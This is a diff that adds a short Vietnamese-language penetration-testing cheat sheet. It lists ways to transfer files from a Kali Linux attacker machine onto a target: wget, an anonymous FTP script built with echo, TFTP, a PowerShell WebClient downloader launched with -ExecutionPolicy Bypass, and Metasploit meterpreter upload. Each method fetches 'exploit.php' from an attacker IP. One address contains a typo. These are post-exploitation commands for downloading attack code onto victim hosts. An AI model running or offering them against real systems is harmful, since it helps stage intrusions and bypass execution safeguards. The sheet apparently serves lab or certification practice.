@@ -1,0 +1,50 @@
+Một số phương thức dùng để chuyển đổi file từ máy Kali Linux lên máy mục tiêu:
+
+>wget 
+
+Usage: wget url/file
+Example: wget http://192.168.27.160/exploit.php
+
+>HTTP
+
+>FTP
+
+Cài đặt thư viện pyftpdlib trên Kali Linix
+apt-get install python-pyftpdlib
+cd /var/www/html
+python -m pyftpdlib -p 21
+
+Viết 1 script nhỏ để tự động download file với giao thức FTP trên máy mục tiêu.
+##########################
+echo open 192.168.27.160 > ftp.txt
+echo anonymous>>ftp.txt
+echo pass >>ftp.txt
+echo binary >>ftp.txt
+echo get exploit.php >> ftp.txt
+echo bye >> ftp.txt
+##########################
+
+>TFTP (XP & 2003)
+
+server: atftpd --daemon --port 69 /var/www/html
+client: tftp -i 192.169.27.160 get exploit.php
+
+>Powershell
+
+echo $storage = $pwd > get.ps1
+echo $webclient = New-Object System.Net.Webclient >> get.ps1
+echo $url = "http://192.168.27.160/exploit.php >> get.ps1
+echo $file = "exploit.php" >> get.ps1
+echo $webclient.DownloadFile($url,$file) >> get.ps1
+powershell.exe -ExecutionPolicy Bypass -Nologo -NonInteractive -NoProfile -File get.ps1
+
+>Metasploit
+- use auxiliary/server/ftp
+- use meterpreter:
+	+ meterpreter > upload /var/www/html/exploit.php c:\\Users\IEUser\exploit.php
+	+ meterpreter > download c:\\Users\\IEUser\\exploit.php /var/www/exploit.php
+
+
+
+
+
